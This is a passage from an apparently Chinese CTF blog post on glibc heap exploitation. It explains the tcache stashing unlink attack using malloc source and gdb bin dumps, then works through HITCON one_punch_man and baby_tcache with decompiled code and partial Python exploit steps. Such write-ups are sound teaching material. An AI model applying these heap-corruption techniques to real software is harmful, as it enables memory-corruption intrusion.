<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x6026c0 —▸ 0x602620 —▸ 0x602580 —▸ 0x6024e0 —▸ 0x602440 ◂— ...</span><br><span class="line"></span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x602390 —▸ 0x602250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x602390</span><br><span class="line">BK: 0x602250 —▸ 0x602390 —▸ 0x7fffffffdbf0 —▸ 0x7fffffffdc00 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>接下来因为是用calloc来申请的，而calloc不会选取tcache中的堆块，所以也就是从small bin中取出<code>0x602250</code>这块chunk（FIFO），接下来：① 因为tcache中还有剩余位置，所以small bin中剩下的两块chunk会被放到tcache中。② 在①的过程中small bin只会检查第一个chunk的完整性，也就是<code>0x602390</code>，而不会对我们伪造的chunk进行检查</p>
<p>所以最后我们就通过这样的方式将我们伪造的chunk放到了tcache上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x7fffffffdc00 —▸ 0x6023a0 —▸ 0x6026c0 —▸ 0x602620 —▸ 0x602580 ◂— ...</span><br><span class="line"></span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x602390 —▸ 0x6026c0 ◂— 0x0</span><br><span class="line">BK: 0x7fffffffdc00 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>那么下一次<code>malloc(0x90);</code>得到的块就直接是我们伪造的块了</p>
<h4 id="除此之外"><a href="#除此之外" class="headerlink" title="除此之外"></a>除此之外</h4><p>在这整个过程中其实同时完成了一次libc地址的写入，具体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>到第25行为止是用来将chunk从small bin中取出的。往后到49行为止，是用来循环将剩余chunk放到tcache中的，除了能用这部分将fake chunk放到tcache，还有一个能利用的点在于第45行<code>bck-&gt;fd = bin;</code>，这行代码将bin（也就是small bin的main_arena）写到了<code>bck-&gt;fd</code>中，也就是说如果我们能控制bck，就能向任意地址写入一个libc地址，总体效果其实跟unsorted bin attack一样，但是由于2.29之后unsorted bin attack就失效了，所以看情况吧。</p>
<h3 id="HITCON-2019-one-punch-man"><a href="#HITCON-2019-one-punch-man" class="headerlink" title="HITCON 2019 one_punch_man"></a>HITCON 2019 one_punch_man</h3><p>知识点：tcache stashing unlink attack</p>
<p>（libc-2.29）</p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序开了沙箱，要用orw</p>
<p>程序一开始的操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( !ptr )</span><br><span class="line">  error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">v3 = ptr;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">qword_4030 = (ptr &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL) + <span class="number">16</span>;</span><br></pre></td></tr></table></figure>

<p>这几步相当于将heap_base+0x10赋值给了qword_4030。</p>
<p>菜单，分别对应add、edit、show、free四个功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_1B62(<span class="string">&quot;############################\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;👼     One Punch Man      👼\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;############################\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   1. debut               #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   2. rename              #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   3. show                #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   4. retire              #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   5. Exit                #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;############################\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_1B62(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">add</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-418h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-414h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+10h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+418h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1B62(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  v3 = sub_1BF9();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    error(<span class="string">&quot;invalid&quot;</span>, a2);</span><br><span class="line">  sub_1B62(<span class="string">&quot;hero name: &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  size = read(<span class="number">0</span>, s, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, s);</span><br><span class="line">  s[size - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x7F</span> || size &gt; <span class="number">0x400</span> )</span><br><span class="line">    error(<span class="string">&quot;poor hero name&quot;</span>, s);</span><br><span class="line">  qword_4040[<span class="number">2</span> * v3] = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">  qword_4048[<span class="number">2</span> * v3] = size;</span><br><span class="line">  <span class="built_in">strncpy</span>(qword_4040[<span class="number">2</span> * v3], s, size);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>别的功能函数没什么特别的所以不贴了，free功能函数那里有一个uaf漏洞</p>
<p>程序主逻辑中还给了一个后门函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v4 == 0xC388 )</span><br><span class="line">  backdoor();</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">backdoor</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(qword_4030 + <span class="number">0x20</span>) &lt;= <span class="number">6</span> )</span><br><span class="line">    error(<span class="string">&quot;gg&quot;</span>, a2);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x217</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">    error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x217</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Serious Punch!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;( ﾟДﾟ)σ弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌⊃&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这题的问题就在于add功能函数中所分配的chunk是用calloc得到的，而calloc不会从tcache中取块，这也就意味着即便我们有uaf，能够修改tcache bin chunk的fd指针，我们也没办法在add功能函数中将伪造的chunk取出来。</p>
<p>我们看到其实后门函数所提供的功能也只是用malloc来申请一个chunk而已，但是这个malloc就能让我们实现将tcache中的假块取出来，所以我们还是得要用到这个后门函数。那么很自然就要想到怎么满足它的条件<code>*(qword_4030 + 0x20) &gt; 6</code>，<code>qword_4030 + 0x20</code>也就是heap_base+0x30。</p>
<p>我们想要修改这个值其实总结下来会有很多方法，但是首先很自然的会想到unsorted bin attack，而由于在libc-2.29下对unsorted bin的拆链增加了完整性检查，使得unsorted bin attack无法再使用了。</p>
<p>既然这题用了calloc，那么就可以往tcache stashing unlink attack这个方向去想，那么我们总体的流程就是：</p>
<ol>
<li>将至少两个chunk从unsorted bin放到small bin，这个过程可以触发malloc_consolidate()来完成</li>
<li>将small bin中第二个chunk（后入链的chunk）的bk改成目标地址</li>
<li>从这个small bin中取出一个chunk，同时要保证tcache中至少有一个空位</li>
</ol>
<p>很明显可以发现存在一些问题，因为想要直接将small bin大小的chunk放到unsorted bin就意味着对应大小的tcache已经满了，而我们后续用calloc是无法从tcache中取出chunk的，那么也就无法满足第三点中的tcache要有空位的条件。</p>
<p>这时就有解决这个问题的思路以及知识点了：利用unsorted bin中的last remainder chunk。</p>
<p>例如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>]	A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span>);<span class="built_in">free</span>(A);	*<span class="number">7</span></span><br><span class="line">[<span class="number">2</span>]	A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span>);<span class="built_in">free</span>(A);	<span class="comment">//into unsorted bin</span></span><br><span class="line">[<span class="number">3</span>]	A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span><span class="number">-0x100</span>);			<span class="comment">//last remainder size == 0x100</span></span><br><span class="line">[<span class="number">4</span>]	<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span>);			<span class="comment">//last remainder into small bin</span></span><br></pre></td></tr></table></figure>

<p>解释：首先将0x400大小的tcache塞满，此时再free一块0x400的chunk，这个chunk就会进入到unsorted bin中。然后申请0x300大小的chunk，那么这个0x310的chunk就会从unsorted bin里割出来，last remainder就是剩下的0x100。最后申请一个比0x100大的chunk，last remainder就会直接被放进对应的bin中。</p>
<p>具体到这题：</p>
<p>首先为了能将chunk放到unsorted bin，先将一条tcache bin链塞满，同时为了满足tcache stashing unlink attack的攻击条件，将另一条tcache bin链留剩一个位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br><span class="line">	free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>开始将两个chunk放入到small bin</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)	<span class="comment">#into unsorted bin</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x300</span>)	<span class="comment">#padding</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x300</span>)	<span class="comment">#last remainder == 0x100</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x300</span>)	<span class="comment">#last remainder into small bin</span></span><br><span class="line"><span class="comment">#again</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x300</span>)</span><br></pre></td></tr></table></figure>

<p>进过上面操作之后small bin中就有两个chunk，值得注意的是在将第二个chunk放入small bin的时候要注意申请块的大小一定要大于small bin中已有的那个块的大小，否则就会直接将这个已经放进small bin的chunk拿出来。</p>
<p>接下来修改第二个放进small bin的chunk的bk指针为<strong>目标地址-0x10</strong>，fd指针不用动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smallbins</span><br><span class="line">0x100 [corrupted]</span><br><span class="line">FD: 0x55d14d2ce200 —▸ 0x55d14d2cd7d0 —▸ 0x7ff22449bd90 (main_arena+336) ◂— 0x55d14d2ce200</span><br><span class="line">BK: 0x55d14d2cd7d0 —▸ 0x55d14d2ce200 —▸ 0x55d14d2cb01b ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>最后从这条small bin链中取出一个chunk就完成了攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br></pre></td></tr></table></figure>

<p>后面的部分很简单就不贴了</p>
<h3 id="HITCON-2018-PWN-baby-tcache"><a href="#HITCON-2018-PWN-baby-tcache" class="headerlink" title="HITCON 2018 PWN baby_tcache"></a>HITCON 2018 PWN baby_tcache</h3><p>（libc-2.27）</p>
<p>这题的难点在于没有泄漏点，要知道怎么修改<code>_IO_2_1_stdout_</code>这个结构体来完成泄漏的知识点。</p>
<p>在此之前还需要用off-by-one构造堆重叠，以此获得uaf的效果。</p>
<p>各函数内容如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;🍊      Baby Tcache      🍊&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$   1. New heap           $&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$   2. Delete heap        $ &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$   3. Exit               $ &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v2) = <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !heap[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = sub_B27(<span class="string">&quot;Size:&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  sub_B88(v5, size);</span><br><span class="line">  v5[size] = <span class="number">0</span>;</span><br><span class="line">  heap[i] = v5;		<span class="comment">//off-by-null</span></span><br><span class="line">  v2 = heap_size;</span><br><span class="line">  heap_size[i] = size;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = sub_B27();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heap[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(heap[v1], <span class="number">0xDA</span>, heap_size[v1]);</span><br><span class="line">    <span class="built_in">free</span>(heap[v1]);</span><br><span class="line">    heap[v1] = <span class="number">0LL</span>;</span><br><span class="line">    heap_size[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;:)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>保护全开，程序逻辑和功能都很简单，只有add和free两个功能，而且只有一个off-by-null漏洞</p>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>为了满足unlink对fd/bk的检查，最前面的被合并的块需要能够进到unsorted bin来设置其fd/bk，同时为了避免tcache的影响，我们需要一个大块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#6</span></span><br></pre></td></tr></table></figure>

<p>chunk5是后面要用来触发合并的块，chunk1-4是中间用来被合并的块，为了后续的使用所以多夹了几块，同时申请chunk6用来防止和top chunk合并</p>
<p>到这里为止我们需要用chunk4来修改chunk5的prev size以及inuse位，这个很简单，把chunk4 free掉之后再申请出来就行。</p>
<p>因为chunk0大于tcache的范围，所以直接free掉它就能进unsorted bin。</p>
